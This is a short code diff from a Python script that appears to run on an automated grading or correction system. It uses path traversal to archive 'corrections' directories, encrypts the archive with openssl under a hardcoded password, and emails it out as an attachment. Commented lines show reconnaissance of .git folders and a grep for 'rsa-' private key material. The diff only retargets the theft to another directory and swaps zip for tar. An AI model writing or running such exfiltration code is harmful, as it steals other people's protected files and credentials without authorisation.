@@ -39,9 +39,10 @@ def get_data(command):
 # my_data += "\n#######################\n"
 # my_data += get_data("ls -al ../../../../corrections_*/.git/") or ""
 # my_data += "\n#######################\n"
-my_data = get_data("zip -r file.zip ../../../../corrections_*/corrections/333/") or ""
+# my_data = get_data("zip -r file.zip ../../../../corrections_*/corrections/301/") or ""
+my_data = get_data("tar cvf file.tar ../../../../corrections_*/corrections/301/") or ""
 # my_data += "\n#######################\n"
-my_data += get_data("openssl enc -aes-256-cbc -e -pbkdf2 -in file.zip -out file.enc -k '123'") or ""
+my_data += get_data("openssl enc -aes-256-cbc -e -pbkdf2 -in file.tar -out file.enc -k '123'") or ""
 # my_data += "\n#######################\n"
 # file_dir = get_data("grep -rl 'rsa-' ../../../../").split()[-1] or ""
 # my_data += "\n#######################\n"
@@ -75,7 +76,7 @@ def send_data_file(zip_filename="data.zip", message="no_data"):
     # Attach the message
     msg.attach(MIMEText(message, 'plain'))
 
-    # Attach the zip file
+    # Attach the zip file;
     with open(zip_filename, 'rb') as attachment:
         part = MIMEBase('application', message)
         part.set_payload(attachment.read())
